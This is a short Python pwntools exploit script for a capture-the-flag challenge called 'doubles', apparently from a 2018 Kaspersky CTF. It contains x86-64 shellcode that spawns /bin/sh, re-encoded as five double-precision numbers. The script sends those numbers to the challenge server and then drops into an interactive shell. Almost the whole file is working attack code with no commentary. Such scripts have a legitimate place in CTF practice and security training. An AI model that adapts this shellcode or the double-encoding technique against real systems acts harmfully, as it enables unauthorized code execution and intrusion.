#!/usr/bin/python

from pwn import *

TIMEOUT = 1

SHELLCODE =  "\xbc\x00\x15\x60\x00\x53\x53\x5e"\
             "\x5a\x48\xbf\x2f\x62\x69\x6e\x2f"\
             "\x2f\x73\x68\x6a\x3b\x58\x52\x57"\
             "\x54\x5f\x0f\x05"

# the shellcode above converted to doubles:
DOUBLE_NUM_1 = "2.4130147898742321e+146"
DOUBLE_NUM_2 = "3.2060568106980501e-80"
DOUBLE_NUM_3 = "4.4117204190430808e+112"
DOUBLE_NUM_4 = "2.6371912725192384e-284"
DOUBLE_NUM_5 = "2.4130147841327864e+143"

def recv_response(p):
    r = p.recv()
    #r = p.recvrepeat(TIMEOUT)
    print "[+] Response: " + r
    return r

#p = process("./doubles")
p = remote("doubles.2018.ctf.kaspersky.com", 10001)

#gdb.attach(p)

# n:
recv_response(p)
p.sendline("5")

p.sendline(DOUBLE_NUM_1)

p.sendline(DOUBLE_NUM_2)

p.sendline(DOUBLE_NUM_3)

p.sendline(DOUBLE_NUM_4)

p.sendline(DOUBLE_NUM_5)

p.interactive()
